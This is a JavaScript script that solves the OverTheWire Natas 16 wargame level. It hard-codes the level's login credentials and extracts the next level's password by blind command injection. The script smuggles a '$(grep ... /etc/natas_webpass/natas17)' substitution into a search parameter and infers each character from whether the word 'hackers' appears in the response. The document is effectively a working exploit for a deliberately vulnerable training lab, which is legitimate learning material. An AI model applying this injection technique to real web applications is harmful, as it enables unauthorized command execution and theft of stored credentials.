const axios = require("axios");

const url = "http://natas16.natas.labs.overthewire.org";
const auth_username = "natas16";
const auth_password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V";

const characters = [
  ..."abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
];

const getPassword = async () => {
  let password = "";
  for (let i = 1; i <= 33; i++) {
    let foundChar = false;
    for (const char of characters) {
      const query = new URLSearchParams();
      query.append(
        "needle",
        `$(grep -E ^${password}${char}.* /etc/natas_webpass/natas17)hackers`
      );
      const uri = `${url}?${query.toString()}`;

      try {
        const response = await axios.get(uri, {
          auth: {
            username: auth_username,
            password: auth_password,
          },
        });
        const text = response.data;

        if (!text.includes("hackers")) {
          password += char;
          foundChar = true;
          console.log(password);
          break;
        }
      } catch (error) {
        console.error("Error:", error.message);
      }
    }
    if (!foundChar) {
      console.error("Character not found");
      break;
    }
  }
};

getPassword();
